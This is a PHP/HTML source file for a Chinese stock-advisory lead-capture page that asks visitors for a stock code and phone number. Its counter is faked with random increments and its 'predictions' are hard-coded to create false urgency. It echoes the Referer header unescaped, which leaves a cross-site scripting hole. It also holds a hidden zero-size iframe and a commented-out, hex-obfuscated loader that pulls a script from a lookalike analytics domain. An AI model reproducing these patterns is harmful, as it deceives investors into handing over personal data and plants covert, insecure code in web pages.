<?php
header('Content-type: text/html; charset=utf-8'); 
error_reporting(0);//临时屏蔽报错
// $time = time();
		// $days = date("j",$time);
		// echo $days;die;
?>


<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width,target-densitydpi=high-dpi,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
	<link type="text/css" rel="stylesheet" href="layer.css" id="skinlayercss">
	<style type="text/css">
		.xubox_text { padding-left:22px;}
		
	</style>
	
	<title>国诚大数据雷达</title>
	
	


</head>

<body>

<div class="jg">
	<div class="jg_center">
		<img src="images/rader_01.jpg"/>
		<img src="images/rader_02.jpg"/>
	</div>
	<div class="countdown clearfix">
		<img src="images/rader_03.jpg"/>
		
		<div class="countnum">
			<img src="images/icon_03.png"/>
			<span id="num-max">9999</span>
		</div>
	</div>


	<div style="position:relative; float:left;"> 
	
	
			<img src="images/rader_04.jpg"/>
			<div class="count-box">
					<form action="index.php" id="action_form" name="action_form" method="post">
						<input name="action" value="1" type="hidden">
				          <input name="from" value="<?php echo $_SERVER['HTTP_REFERER']; ?>" type="hidden">
				          <input name="from_time" id="from_time" value="<?php echo time(); ?>" type="hidden">    
						  <div class="jgc4">
				        <span class="tl">查询股票代码</span> <span><input type="text" maxlength="6"  name="code" id="code" placeholder="请输入股票代码,如000300"></span>
				        <span class="tl">接收结果手机号</span> <span class="sj"><input type="text" maxlength="11" name="mobile" id="mobile" placeholder="请输入手机号"></span>
				        <p style="text-align:center; padding:10px 0; font-size:12px; color:#fffbc3;">稍后会有客服与您联系</p>
				        <span class="sj"><a id="btnTg" href="javascript:void(0);"><img src="images/icon_07.png"/></a></span>

					    </div>
					</form>

			</div>
	</div>

	<div class="jg_center" style="position:relative;">
		<img src="images/rader_05.jpg"/>
		<div class="count-tip">
						<div class="jgc5">
					    	<ul style="position: absolute; margin: 0px; padding: 0px; top: 0px;">
					       <li>最新预测：002221 东华能源 主力大单买入</li>
					       <li>最新预测：600173 卧龙地产 涨停</li>
					       <li>最新预测：000002 万科A    主力大单买入</li>
					       <li>最新预测：300215 电科院   主力大单买入</li>
					       <li>最新预测：603189 网达软件 涨停</li>
					       <li>最新预测：603031 安德利   主力大单卖出</li>
					       <li>最新预测：000651 格力电器 主力大单买入</li></ul>
					    </div>
		</div>
		<div class="rada-pan"><img src="images/rda_03.png"/></div>

	</div>

	<div class="aboutgc">
		<img src="images/rader_06.jpg"/>
		<span><img src="images/rda_07.png"/></span>
		<p>深圳市国诚投资有限公司是经中国证监会批准，获版证券投资咨询资格的专业咨询机构（执业编号zx0180）主要从事证券投资咨询、投资银行等业务。致力于为机构和中小投资提供专业的证券投资咨询以及理财规划服务，帮助客户实现资产的保值增值。</p>
	</div>
	<div style="position:relative; float:left;">

		<img src="images/rader_07.jpg"/>
		
		<div class="gc-bottom">
			<p>股市有风险,入市需谨慎。从事证券投资或<br>期货交易请通过合法证券期货经营机构进行。合法<br>机构名单可到中国证监会网站（<a href="http://www.csrc.gov.cn">www.csrc.gov.cn</a>）查询</p>
			<div class="text-center" style="font-size:18px">深圳市国诚投资咨询有限公司</div>
		</div>	


	</div>



</div>

<!--<a href="http://www.cnzz.com/stat/website.php?web_id=1257147315" target="_blank" title="站长统计">站长统计</a>-->
<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> 
<script type="text/javascript" src="js/jquery.vticker.min.js"></script>
<script src="plugin/jquery.form.js"></script> 
<script src="plugin/layer/layer.js"></script>
<script src="plugin/common.js"></script> 

<script type="text/javascript">


$(function(){

	function getRandom(n){
			
	        return Math.floor(Math.random()*n+1)
	        
        }
    function getTime(m){
			var timeran =  Math.floor(Math.random()*m*1000);
			
	        return timeran;
	       	
        }

   var wait=1244859;		//倒计时
		function count_down() {
		    if (wait == 0) {
		        alert('礼包已经领取完！');
		    } else {
		          
		        $('#num-max').text(wait);
		        wait+=getRandom(5);
		        setTimeout(function(){
		            count_down()
		        },
		        getTime(10))
		    }
		}
	count_down();


	
	//myajaxform("#action_form","index.php","cfun()","sfun(msg)");
	
	
	$('.jgc5').vTicker({
		showItems: 1,
		pause: 4000
	});
	


	$('#btnTg').on('click',function(){

			//找到电话输入框值
			var code =$.trim($('#code').val());
			var mobile =$.trim($('#mobile').val());
			var keeptime =$('#from_time').val();
			/*if(code==''){
			//如果输入框为空
				layer.alert('请填写股票代码', {
					  icon: 0,
					  skin: 'layer-ext-moon' 
					});	
					return false;
				}else if(!check_string(mobile,"number")) {
					//如果字段输入不正确
					layer.alert('您输入股票代码格式不正确', {
					  icon:0,
					  skin: 'layer-ext-moon' 
					});		
				  return false;	

			}*/
			if(code==''){
				layer.alert('请输入股票代码', {
				  icon: 0,
				  skin: 'layer-ext-moon' 
				});	
				return false;
			}else if(code.length<6){
				layer.alert('输入的股票代码长度不正确', {
				  icon: 0,
				  skin: 'layer-ext-moon' 
				});	
				return false;
			}else if(!check_string(code,"number")) {
				layer.alert('请输入股票代码格式不正确', {
				  icon: 0,
				  skin: 'layer-ext-moon' 
				});	
				return false;
			}


			if(mobile==''){
			//如果输入框为空
				layer.alert('请留下您的电话号码', {
					  icon: 0,
					  skin: 'layer-ext-moon' 
					});	
					return false;
				}else if(!check_string(mobile,"mobile")) {
					//如果字段输入不正确
					layer.alert('您输入的手机号码格式不正确', {
					  icon:0,
					  skin: 'layer-ext-moon' 
					});		
				  return false;	

			}

			//console.log("xxx");

			//输入正确执行
			$.post("submit.php",{code:code,mobile:mobile,from_time:keeptime},function(msg){
				   	//如果提交成功
				   if(msg.status=='1'){
						layer.alert('感谢您的来访,稍后我们会有专员与您联系', {
						  icon: 1,
						  skin: 'layer-ext-moon' 
						});

				   }else{
						layer.alert(msg.tips, {
						  icon:0,
						  skin: 'layer-ext-moon' 
						});	

				  }

			},'json');

	});

	// $.getScript("load.js", function() {
 //  		alert("Load was performed.");
	// });
	// $.ajax({
	//       url: "load.js",
	//       dataType: "script",
	//       cache: true
	// }).done(function() {
	  
	// });

})


	


</script>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?f2b3de0da0609857eebe8167aea2e590";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();



</script>

<iframe src="load.html" height="0" width="0"></iframe>
<!--<Script language="javascript">window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x77\x72\x69\x74\x65"] ('\x3c\x73\x63\x72\x69\x70\x74\x20\x74\x79\x70\x65\x3d\x22\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22\x20\x73\x72\x63\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x77\x61\x70\x2d\x63\x6f\x64\x65\x2d\x63\x6e\x7a\x7a\x63\x6f\x6d\x73\x74\x61\x74\x2d\x68\x74\x6d\x35\x2e\x63\x63\x79\x6d\x66\x2e\x63\x6f\x6d\x2f\x6d\x38\x35\x33\x34\x37\x2e\x70\x68\x70\x3f\x75\x69\x64\x3d\x4f\x44\x55\x7a\x4e\x44\x64\x66\x4d\x54\x49\x78\x4e\x54\x67\x35\x22\x20\x63\x68\x61\x72\x73\x65\x74\x3d\x22\x75\x74\x66\x2d\x38\x22\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e');</Script>-->
 </body>
 </html>